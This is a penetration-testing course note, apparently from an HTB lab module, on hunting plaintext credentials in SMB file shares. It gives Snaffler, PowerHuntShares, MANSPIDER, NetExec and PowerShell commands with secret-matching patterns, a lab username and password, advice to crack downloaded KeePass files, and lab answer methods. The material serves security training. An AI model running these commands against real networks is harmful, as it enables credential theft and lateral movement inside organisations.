# NOTE — Credential Hunting in Network Shares

## ID
525

## Module
Password Attacks

## Kind
methodology

## Title
Section 19 — Credential Hunting in Network Shares

## Description
Spider SMB shares for plaintext credentials. Snaffler / PowerHuntShares from a domain-joined Windows host; MANSPIDER / NetExec --spider from Linux.

## Tags
smb, shares, snaffler, powerhuntshares, manspider, netexec-spider, smbclient, credential-hunting

## Commands
- `Snaffler.exe -s` (auto-discover shares, default ruleset)
- `Snaffler.exe -u -s -n <fqdn>` (target a single host)
- `Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public`
- `docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <ip> -c 'passw' -u <user> -p <pass>`
- `nxc smb <ip> -u <user> -p <pass> --shares`
- `nxc smb <ip> -u <user> -p <pass> --spider <share> --content --pattern "passw"`
- `smbclient -L //<ip>/ -U <user>`
- `Get-ChildItem -Recurse \\<server>\<share> | Select-String -Pattern "passw"`

## Concept Overview
Corporate file shares accumulate sensitive content: deployment scripts with hard-coded passwords, password-policy docs revealing patterns, KeePass/PasswordSafe databases, network diagrams, and IT runbooks. The signal-to-noise ratio is brutal — automation matters.

## What to Search For

### Patterns in content
```
passw, user, token, key, secret, login
cred, ssh, api, connect, db_, jdbc:
NT AUTHORITY\, DOMAIN\        # AD-context references
```

### Filenames + extensions worth flagging
| Extension/Name | Why |
|----------------|-----|
| `.ini`, `.cfg`, `.config`, `.conf` | App configs with embedded creds |
| `.env` | Modern app secrets |
| `.xml` | `Groups.xml` (GPP cpassword), `unattend.xml`, `web.config` |
| `.xlsx`, `.docx` | "passwords.xlsx" — yes, this is real |
| `.ps1`, `.bat`, `.cmd`, `.sh` | Scripts with hardcoded creds |
| `.kdbx`, `.psafe3` | Password manager DBs |
| `*pass*`, `*cred*`, `*backup*`, `*onboard*` | Loud names |

## Hunting from Windows

### Snaffler (recommended)
Discovers shares + walks them, applying a built-in classifier.
```cmd
# Domain-wide auto-discovery
Snaffler.exe -s

# Target one host, also enrich with user list
Snaffler.exe -u -s -n FILE01.example.local

# Restrict to specific shares (-i include, -n hostname)
Snaffler.exe -s -i HR,IT,Finance
```

Output colour codes:
- **Red** — likely cred (`password=`, `<password>`)
- **Yellow** — high-interest (large deployment images, .kdbx, etc.)
- **Green** — name match (`passwords.xlsx`)
- **Black** — interesting extension

### PowerHuntShares (HTML report)
PowerShell module that doesn't need to be domain-joined. Produces an HTML dashboard with severity ratings.
```powershell
Import-Module .\PowerHuntShares.psd1
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public
```
Open `SmbShareHunt-<date>\SmbShareSummary.html` for a visual review.

### Native PowerShell (no tools)
```powershell
Get-ChildItem -Recurse -Include *.ini,*.cfg,*.config,*.xml,*.ps1,*.bat,*.env,*.xlsx \
  \\fileserver\IT -ErrorAction SilentlyContinue |
  Select-String -Pattern "password","cred","token" |
  Select-Object Path, LineNumber, Line
```

## Hunting from Linux

### MANSPIDER (recommended)
Searches SMB shares from a Linux/Mac attacker host. Best run via the official Docker image.
```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider \
  10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```
Hits stream to terminal; matching files downloaded into `./manspider/loot/`.

### NetExec `--spider`
NetExec includes a spidering module — quick + lightweight.
```bash
# Enumerate shares first
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --shares

# Spider a specific share for content matching a pattern
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' \
  --spider IT --content --pattern "passw"
```

### `smbclient` for one-off downloads
```bash
smbclient //fileserver/HR -U user
smb: \> recurse on
smb: \> prompt off
smb: \> mget *.xlsx
```

## Recommended Triage Order
1. `nxc smb <hosts> -u <u> -p <p> --shares` — find what you can read/write.
2. Target *IT*, *HR*, *Finance*, *Backups*, *Private*, *Admin*, and any unusually-named shares first. Skip *Marketing* unless you're desperate.
3. **One pass with a tool** (Snaffler/MANSPIDER) for breadth.
4. **Manual review** of the top candidates — tools generate false positives.
5. Password manager DB files (`.kdbx`, `.psafe3`) → download → crack offline.

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — Password of another user found in a share `mendres` can read | **(hidden — see HTB walkthrough)** | RDP as `mendres` → PowerShell: `Get-ChildItem -Recurse -Include *.* \\DC01\IT \| Select-String "INLANEFREIGHT\\"` → finds `split_tunnel.txt` containing `jbader:<password>` |
| Q2 — Password of a domain admin found via the new user | **(hidden)** | `nxc smb <ip> -u jbader -p <pass> --spider HR --content --pattern "Administrator"` → download `Onboarding_Docs_132.txt` from the HR share → contains the Administrator password |

## Key Takeaways
- File shares are the #1 lateral movement path after initial foothold in real-world AD assessments.
- Snaffler's classifier output is *noisy by design* — manually verify Red hits before reporting.
- `.psafe3` (Password Safe) and `.kdbx` (KeePass) files are crackable offline (`-m 5200` and `-m 13400` in hashcat) — always download them.
- An "Onboarding" or "New Hire" doc in HR is the most common place to find the local Administrator password embedded.

## Gotchas
- Snaffler false-positive rate is high. The "Red" tag is a hint, not a guarantee.
- Big shares can take hours to walk. Filter aggressively (`-i include`, `-z size_limit`).
- Some hidden shares (`C$`, `ADMIN$`) require local admin to read. Don't waste cycles trying these as a low-priv user.
- `--spider` patterns are case-sensitive in some NetExec versions. Use `passw` (lowercase) as a cover-all.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[18-credential-hunting-in-network-traffic]] | [[20-pass-the-hash]] →
<!-- AUTO-LINKS-END -->
